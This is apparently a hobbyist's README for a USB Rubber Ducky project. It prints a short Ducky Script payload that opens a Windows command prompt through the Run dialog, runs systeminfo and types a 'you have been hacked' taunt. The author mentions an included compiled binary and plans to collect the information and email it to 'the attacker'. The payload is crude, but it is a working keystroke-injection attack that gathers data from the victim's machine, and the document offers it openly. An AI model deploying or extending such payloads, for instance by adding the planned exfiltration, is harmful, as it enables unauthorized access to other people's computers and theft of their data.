# DuckyProjects
My work with my USB rubber ducky
Inject(5) is a basic ducky script that gets system info in Windows and alerts the person has been hacked 
The Script is as follows:
REM Open cmd
GUI r
DELAY 500
STRING cmd
DELAY 500
ENTER
DELAY 500
String systeminfo
ENTER
DELAY 1000
STRING CONGRATULATIONS, YOU HAVE BEEN HACKED!!!!
I have included the bin in code. I believe I should have made the alert first. Also I want to eventually mkdir of the info and email it to
the attacker.
